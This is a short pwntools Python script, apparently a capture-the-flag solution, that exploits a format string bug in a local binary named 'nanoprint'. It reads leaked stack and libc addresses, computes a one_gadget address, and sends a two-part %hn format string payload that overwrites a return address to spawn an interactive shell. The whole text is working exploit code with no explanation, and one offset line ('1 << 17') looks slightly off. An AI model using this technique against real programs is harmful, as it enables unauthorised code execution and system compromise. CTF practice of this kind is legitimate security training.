from pwn import * 

p = process(["/lib64/ld-linux-x86-64.so.2", "./nanoprint"], env={"LD_PRELOAD" : "./libc.so.6"}) 
# libc = ELF("/lib/i386-linux-gnu/libc.so.6") 
libc = ELF("./libc.so.6")

def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def debug(bp):
    script = ""
    PIE = get_PIE(p)
    PAPA = PIE
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    gdb.attach(p,gdbscript=script) 

context.terminal = ["tmux", "splitw", "-h"]



stack = eval(p.recv(10)) + 0x71 
libc_address = eval(p.recv(10)) + 4 * 72 - libc.sym['__libc_system']
one_gadget = libc_address + 0x10a38c     # 0x3d0d5 0x3d0d9 0x3d0e0 0x67a7f 0x67a80 0x137e5e 0x137e5f
print(hex(one_gadget))
def format8(str) : 
    return str + '0' * (8 - len(str) % 8)
# debug([0x10D9])  


part1 = one_gadget & 0xffff
part2 = (one_gadget & 0xffff0000) >> 16
if part2 < part1 : 
    part2 += 1 << 17
context.log_level = "debug"
print(hex(part2))
payload = "%" + str(part1) + "x%15$hn%" + str(part2 - part1) + "x%16$hn"
payload = format8(payload) + "a" +  p32(stack) + p32(stack+2)
print(payload)
p.sendline(payload)
p.interactive()

